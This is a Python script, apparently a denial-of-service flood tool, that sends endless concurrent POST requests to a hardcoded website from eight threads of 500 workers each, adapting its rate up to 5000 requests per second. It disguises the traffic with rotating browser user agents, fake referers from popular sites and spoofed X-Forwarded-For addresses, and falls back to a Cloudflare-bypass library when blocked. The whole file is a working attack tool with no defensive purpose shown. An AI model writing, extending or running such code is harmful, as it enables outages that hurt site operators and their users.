import asyncio
import random
import time
import aiohttp
import cloudscraper
from threading import Thread
from math import exp
from fake_useragent import UserAgent

TARGET_URL = "https://test.zoomov.cat/"
POST_DATA = {"key": "value"}
TIMEOUT = 3
MAX_RPS = 5000
CONCURRENCY_LEVEL = 500
MAX_RETRIES = 3

USER_AGENTS = [UserAgent().chrome, UserAgent().edge, UserAgent().firefox, UserAgent().safari] * 3 + [UserAgent().random for _ in range(10)]
REFERERS = [
    "https://www.google.com", "https://www.youtube.com", "https://www.facebook.com",
    "https://www.twitter.com", "https://www.instagram.com", "https://www.tiktok.com",
    "https://www.netflix.com", "https://www.amazon.com", "https://www.linkedin.com",
    "https://www.reddit.com", "https://www.microsoft.com", "https://www.apple.com",
    "https://www.whatsapp.com", "https://www.pinterest.com", "https://www.twitch.tv"
]

class TurboRateLimiter:
    def __init__(self):
        self.current_rps = 1000
        self.last_update = time.time()
        self.success_count = 0
        self.error_count = 0

    def update(self, success):
        if success:
            self.success_count += 1
        else:
            self.error_count += 1
        
        if time.time() - self.last_update > 0.5:
            success_rate = self.success_count / (self.success_count + self.error_count + 1e-9)
            if success_rate > 0.9:
                self.current_rps = min(self.current_rps * 1.3, MAX_RPS)
            elif success_rate < 0.7:
                self.current_rps = max(self.current_rps * 0.7, 500)
            
            self.success_count = 0
            self.error_count = 0
            self.last_update = time.time()

    def get_delay(self):
        return 0.001 + random.expovariate(self.current_rps / CONCURRENCY_LEVEL)

def generate_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
        "X-Requested-With": "XMLHttpRequest"
    }

async def send_request(scraper, session, rate_limiter):
    for _ in range(MAX_RETRIES):
        try:
            headers = generate_headers()
            await asyncio.sleep(rate_limiter.get_delay())
            async with session.post(TARGET_URL, json=POST_DATA, headers=headers, timeout=TIMEOUT) as response:
                rate_limiter.update(response.status == 200)
                return response.status
        except aiohttp.ClientError:
            try:
                await asyncio.sleep(random.uniform(0.1, 0.5))
                cf_response = await asyncio.to_thread(scraper.post, TARGET_URL, data=POST_DATA, headers=headers, timeout=TIMEOUT)
                rate_limiter.update(cf_response.status_code == 200)
                return cf_response.status_code
            except:
                rate_limiter.update(False)
    return 0

async def worker(scraper, session, rate_limiter, semaphore):
    while True:
        async with semaphore:
            await send_request(scraper, session, rate_limiter)

async def main():
    scraper = cloudscraper.create_scraper()
    rate_limiter = TurboRateLimiter()
    semaphore = asyncio.Semaphore(CONCURRENCY_LEVEL)
    
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=0, force_close=False, enable_cleanup_closed=True),
        timeout=aiohttp.ClientTimeout(total=TIMEOUT)
    ) as session:
        tasks = [asyncio.create_task(worker(scraper, session, rate_limiter, semaphore)) for _ in range(CONCURRENCY_LEVEL)]
        await asyncio.gather(*tasks)

def run_asyncio_loop():
    asyncio.run(main())

if __name__ == "__main__":
    for _ in range(8):
        Thread(target=run_asyncio_loop, daemon=True).start()
    while True:
        time.sleep(1)
